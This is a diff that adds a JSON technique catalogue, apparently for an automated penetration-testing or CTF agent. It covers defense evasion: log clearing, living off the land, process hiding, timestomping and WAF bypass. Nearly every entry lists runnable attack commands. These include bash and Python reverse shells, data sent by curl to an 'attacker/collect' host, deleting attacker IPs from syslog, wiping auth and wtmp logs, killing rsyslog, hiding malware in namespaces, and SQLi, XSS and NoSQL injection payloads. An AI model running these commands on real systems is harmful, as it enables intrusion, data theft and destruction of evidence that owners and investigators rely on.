@@ -1,0 +1,110 @@
+[
+  {
+    "id": "defense-log-clear",
+    "category": "DEFENSE",
+    "subcategory": "Evasion",
+    "title": "Log Clearing — Removing Evidence of Intrusion from System Logs",
+    "description": "After gaining access, attackers clear logs to remove traces of their activities. Techniques: (1) Clear bash history: history -c && > ~/.bash_history. (2) Clear syslog: echo '' > /var/log/syslog (requires root). (3) Clear auth log: echo '' > /var/log/auth.log. (4) Remove wtmp/btmp/utmp: echo '' > /var/log/wtmp; echo '' > /var/log/btmp; echo '' > /var/run/utmp. (5) Clear lastlog: echo '' > /var/log/lastlog. (6) Delete specific entries from logs using sed: sed -i '/ATTACKER_IP/d' /var/log/syslog. (7) Disable bash history for current session: unset HISTFILE; export HISTSIZE=0. (8) Kill logging processes: kill -9 $(pidof rsyslogd) — temporary, service will restart. (9) For Docker containers: logs are often ephemeral, but check Docker logs: docker logs CONTAINER_ID and clear if possible.",
+    "techniques": [
+      "history -c && unset HISTFILE && export HISTSIZE=0",
+      "echo '' > /var/log/syslog; echo '' > /var/log/auth.log",
+      "sed -i '/ATTACKER_IP/d' /var/log/syslog",
+      "Remove wtmp: echo '' > /var/log/wtmp",
+      "Kill logging: kill -9 $(pgrep rsyslogd) 2>/dev/null || systemctl stop rsyslog 2>/dev/null",
+      "Remove command history files: rm -f ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history"
+    ],
+    "indicators": ["Root or sudo access on compromised host", "Writable log files", "Available shell on target system"],
+    "prerequisites": ["Privileged shell access (root or sudo)", "Write access to /var/log/", "Understanding of Linux logging infrastructure"],
+    "tools": ["shell_exec", "ssh_exec"],
+    "tags": ["defense", "log-clear", "evasion", "anti-forensics", "bash-history"],
+    "confidence": 0.9,
+    "mitre_attack": "T1070"
+  },
+  {
+    "id": "defense-living-off-land",
+    "category": "DEFENSE",
+    "subcategory": "Evasion",
+    "title": "Living Off the Land (LOTL) — Using Built-in System Tools for Attack Operations",
+    "description": "LOTL techniques use legitimate system binaries and tools that are already present on the target system to perform attack operations, avoiding detection by EDR/AV that would flag custom malware. Linux LOTL techniques: (1) File transfer: curl/wget/nc for downloading tools, scp/sftp for exfil. (2) Command execution: use bash -c, python -c, perl -e, ruby -e for inline scripting. (3) Data exfiltration: curl -F file=@flag.txt http://attacker/, nc ATTACKER PORT < /flag.txt, base64 /flag.txt | tr -d '\\n'. (4) Port scanning: bash /dev/tcp scan, /bin/nc -zv, python socket scan. (5) Reverse shell: bash -i >& /dev/tcp/ATTACKER/PORT 0>&1, python -c 'import socket...'. (6) Privesc enumeration: find SUID, ls -la /etc/shadow, cat /etc/crontab, sudo -l. (7) Password grabbing: cat /etc/shadow (if readable), find credentials in web config files.",
+    "techniques": [
+      "Bash reverse shell: bash -i >& /dev/tcp/IP/PORT 0>&1",
+      "Python reverse shell: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
+      "Netcat file transfer: nc -l -p PORT < /flag.txt (receiver) | nc IP PORT > /flag.txt (sender)",
+      "Base64 exfil: base64 /flag.txt | tr -d '\\n' | curl -X POST -d @- http://attacker/collect",
+      "Port scan with bash: for port in {1..65535}; do timeout 0.1 bash -c \"echo >/dev/tcp/IP/$port\" 2>/dev/null && echo $port open; done",
+      "Find SUID: find / -perm -4000 -type f -user root 2>/dev/null"
+    ],
+    "indicators": ["Shell access on compromised host", "Available system tools: bash, python, perl, nc, curl", "EDR/AV monitoring for custom binaries", "Target environment with restricted software installation"],
+    "prerequisites": ["Shell access on target", "Standard system utilities available (bash, python, nc, curl)", "Understanding of LOTL technique selection"],
+    "tools": ["shell_exec", "ssh_exec", "curl_get", "send_payload"],
+    "tags": ["defense", "living-off-land", "lotl", "evasion", "built-in", "system-tools"],
+    "confidence": 0.9,
+    "mitre_attack": "T1218"
+  },
+  {
+    "id": "defense-process-hide",
+    "category": "DEFENSE",
+    "subcategory": "Evasion",
+    "title": "Process Hiding — Concealing Malicious Processes from System Monitoring",
+    "description": "Process hiding prevents sysadmins and monitoring tools from detecting attacker processes. Linux techniques: (1) LD_PRELOAD hooking: override readdir/readdir64 in libc to filter process from /proc listing. (2) Mount namespace: unshare to create isolated mount namespace where processes aren't visible to host. (3) Process name spoofing: exec -a FAKE_NAME command — changes argv[0] to look like legitimate process. (4) Hide in plain sight: name processes like system daemons (kworker, systemd-*, dbus-daemon). (5) PID namespace: run in separate PID namespace to hide from host process list. (6) Kernel module: if root with module loading, use diamorphine or similar rootkit for complete process hiding. (7) Docker/podman: run in container to hide from host ps — but process still visible via docker ps.",
+    "techniques": [
+      "Process name spoofing: exec -a '[kworker/u:0]' /path/to/backdoor",
+      "LD_PRELOAD hook: compile .so that hooks readdir to filter /proc entries",
+      "Mount namespace: unshare -m sh -c 'mount -t proc none /proc; ./malware'",
+      "PID namespace: unshare -p -f sh -c './malware'",
+      "Hide as system process: rename binary to systemd-coredump, kworker, etc.",
+      "Docker hide: docker run -d --name innocent_container alpine ./malware"
+    ],
+    "indicators": ["Root access required for LD_PRELOAD/mount namespace techniques", "Available unshare, nsenter commands (util-linux)", "Kernel module loading support for rootkit", "Process list showing anomalies (duplicate kworkers, unexpected daemons)"],
+    "prerequisites": ["Root or sudo access (most techniques require it)", "GCC for compiling .so files (LD_PRELOAD)", "util-linux package (unshare, nsenter)", "Understanding of Linux process visibility"],
+    "tools": ["shell_exec", "ssh_exec"],
+    "tags": ["defense", "process-hide", "evasion", "ld-preload", "namespace", "rootkit"],
+    "confidence": 0.75,
+    "mitre_attack": "T1564"
+  },
+  {
+    "id": "defense-timestomp",
+    "category": "DEFENSE",
+    "subcategory": "Evasion",
+    "title": "Timestomp — Timestamp Manipulation for File Activity Concealment",
+    "description": "Timestomping modifies file timestamps (access, modification, change times) to hide when files were created or modified during an attack. Linux techniques: (1) Reference file: touch -r /etc/passwd /tmp/backdoor — copies timestamps from legitimate file to malicious file. (2) Set specific time: touch -t 202401010101 /tmp/backdoor. (3) Preserve timestamps during file operations: cp -p (preserve), rsync -t (preserve times). (4) Modify only access time: touch -a -r REFERENCE TARGET. (5) Modify only modification time: touch -m -r REFERENCE TARGET. (6) Clear all timestamps to epoch: touch -t 197001010000 TARGET. (7) Use atime mount options: mount -o remount,noatime on sensitive directories to prevent access time updates. (8) For forensic-resistant operations: combine with shred/wipe and log clear.",
+    "techniques": [
+      "Clone timestamps: touch -r /etc/passwd /tmp/backdoor",
+      "Set specific: touch -t 202401010101.01 /tmp/backdoor",
+      "Preserve during copy: cp -p /tmp/backdoor /usr/local/bin/backdoor",
+      "Access time only: touch -a -r /bin/ls /tmp/backdoor",
+      "Modification time only: touch -m -r /bin/ls /tmp/backdoor",
+      "Epoch reset: touch -t 197001010000 /tmp/backdoor",
+      "Check times: stat /tmp/backdoor — verify all three timestamps"
+    ],
+    "indicators": ["Write access to files on target", "touch command available", "Reference file with desired timestamps accessible", "Filesystem supporting atime/mtime/ctime manipulation"],
+    "prerequisites": ["Write access to target files", "touch command with -r, -t options", "Reference file for timestamp cloning", "Understanding of atime/mtime/ctime/btime (birth time on some FS)"],
+    "tools": ["shell_exec", "ssh_exec"],
+    "tags": ["defense", "timestomp", "timestamp", "evasion", "anti-forensics", "touch"],
+    "confidence": 0.9,
+    "mitre_attack": "T1070"
+  },
+  {
+    "id": "defense-waf-bypass",
+    "category": "DEFENSE",
+    "subcategory": "Evasion",
+    "title": "WAF Bypass Techniques — Evading Web Application Firewall Detection",
+    "description": "Web Application Firewalls (WAFs) block common attack patterns. Bypass techniques by category: (1) SQLi bypass: use inline comments (/**/), case variation (UnIoN SeLeCt), whitespace alternatives (tabs %09, newlines %0a, comments), NULL bytes, Hex/Unicode encoding. (2) XSS bypass: use alternative tags (<svg/onload>, <img src=x onerror=), event handlers, encoding variation (&lt;script&gt; decoding chains). (3) Path traversal: use double encoding (%252e%252e/), Unicode dots (%c0%ae), backslashes (..\\), absolute paths. (4) Command injection: use $IFS instead of spaces, $() instead of `` for command substitution, printf format strings. (5) HTTP parameter pollution: duplicate parameters (id=1&id=1' OR 1=1--), HPP in multipart bodies. (6) HTTP fragmentation: chunked transfer encoding, slowloris-style request splitting. (7) Content-Type manipulation: switch between form-urlencoded, multipart, and JSON. (8) Obfuscation: base64-encoded payloads, gzip compression, protocol smuggling.",
+    "techniques": [
+      "SQLi: ' OR/**/1=1-- / SELECT(column)FROM(table) / UniOn SeLeCt",
+      "XSS: <svg/onload=alert(1)> / <img src=x onerror=alert(1)> / <details open ontoggle=alert(1)>",
+      "Path traversal: ....//....//flag.txt / ..%252f..%252f..%252fflag.txt / ..%c0%afflag.txt",
+      "Cmd injection: cat${IFS}/flag.txt / $(cat /flag.txt) / 'cat /flag.txt'",
+      "HPP: id=1&id=1' OR 1=1-- / id=legitimate&id=malicious",
+      "Encoding: double URL encode, UTF-16, UTF-7, or base64 in appropriate contexts",
+      "Protocol-level: HTTP request smuggling (CL.TE / TE.CL), hop-by-hop headers",
+      "JSON SQLi: {\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}"
+    ],
+    "indicators": ["403/406/WAF block page on malicious request", "WAF header in response (X-WAF, Server: cloudflare, etc.)", "DPM detection of defense presence", "ModSecurity/Cloudflare/Naxsi signature patterns in block pages"],
+    "prerequisites": ["WAF detected on target", "Understanding of WAF bypass techniques for specific vulnerability type", "Ability to craft and send HTTP requests with varied encoding"],
+    "tools": ["send_payload", "sqlmap_test", "ffuf_fuzz", "curl_get", "ssrf_probe"],
+    "tags": ["defense", "waf", "bypass", "evasion", "encoding", "obfuscation", "sql-injection"],
+    "confidence": 0.85,
+    "mitre_attack": "T1562"
+  }
+]
